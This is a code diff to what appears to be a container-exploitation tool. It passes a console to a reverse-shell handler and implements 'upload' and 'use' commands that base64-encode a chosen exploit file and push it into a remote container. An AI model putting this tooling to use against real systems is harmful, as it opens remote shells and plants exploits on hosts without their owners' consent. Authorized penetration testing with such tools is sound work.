@@ -1,5 +1,6 @@
 import json
 import rich
+import base64
 
 from dataclasses import dataclass
 from typing import Callable, Optional
@@ -379,7 +380,7 @@ inspect_cmd.__doc__ = C_INSPECT.desc
 
 ## ------------------------- EXECUTE COMMAND ------------------------
 def execute_cmd(redex_cls, *args, **kwargs) -> None:
-    command = redex_cls.session.s_command 
+    command = redex_cls.session.s_command
     if len(args) == 1 and "=" in args[0]: command = args[0].split("=")[-1]
     command_arguments = []
 
@@ -411,7 +412,9 @@ def execute_cmd(redex_cls, *args, **kwargs) -> None:
     if command == "revshell":
         try:
             addr = f"{redex_cls.session.s_rhost}:{redex_cls.session.s_rport}"
-            rvshell = ReverseShellHandler(redex_cls.session.s_lhost, redex_cls.session.s_lport)
+            rvshell = ReverseShellHandler(
+                redex_cls.console, redex_cls.session.s_lhost, redex_cls.session.s_lport
+            )
             rvshell.handle_rv( redex_cls.container_data.c_default["exec_start"], addr, exec_id)
             return None
         except Exception as e:
@@ -430,14 +433,53 @@ execute_cmd.__doc__ = C_EXECUTE.desc
 
 ## ------------------------- UPLOAD COMMAND ------------------------
 def upload_cmd(redex_cls, *args, **kwargs) -> None:
-    ...
+    old_command = redex_cls.session.s_command
+    setattr(redex_cls.session, 's_command', 'upload')
+
+    exploit = redex_cls.session.s_exploit
+
+    try:
+
+        exploit_object = getattr(redex_cls.exploit_hdl, exploit.lower())
+        exploit_file = exploit_object.path
+        exploit_ext = exploit_object.ext
+    
+    except AttributeError:
+        exploit_file = exploit.split("/")[-1]
+        exploit_ext = exploit_file[len(exploit_file):]
+        exploit_file = exploit
+
+    # Encode the content of the file so that it can be easily sent
+    # through the network and then saved into another file in the 
+    # remote container. Notice that, the exploit that will use
+    # the content of the file, must have a decoder.
+    exploit_encoded = base64.b64encode(
+        open(exploit_file, mode='r').read().encode('ascii')
+    ).decode('ascii')
+
+    execute_cmd(redex_cls, exploit_encoded, exploit_ext)
+    setattr(redex_cls.session, 's_command', old_command)
+        
 
 C_UPLOAD = Command(C_UPLOAD_NAME, C_UPLOAD_CMD, C_UPLOAD_DESC, func=upload_cmd)
 upload_cmd.__doc__ = C_UPLOAD.desc
 
 ## ------------------------- USE COMMAND ------------------------
 def use_cmd(redex_cls, *args, **kwargs) -> None:
-    ...
+    # Check that all arguments are correctly given
+    if len(args) == 0:
+        redex_cls.console.print("[*] [red]The 'use' command requires an argument[/red]")
+        raise Exception
+    
+    # Check that the exploit have been registered in the current session
+    if not hasattr(redex_cls.exploit_hdl, args[0].lower()):
+        redex_cls.console.print(f"[*] [red]Exploit: {args[0]} has not been registered yet![/red]")
+        raise Exception
+
+    setattr(redex_cls.session, 's_exploit', args[0].upper())
+    redex_cls.console.print(f"[*] [green]EXPLOIT => {args[0].upper()}[/green]")
+    setattr(redex_cls, 'printable_exploit', redex_cls.session.s_exploit)
+
 
 C_USE = Command(C_USE_NAME, C_USE_CMD, C_USE_DESC, func=use_cmd)
 use_cmd.__doc__ = C_USE.desc
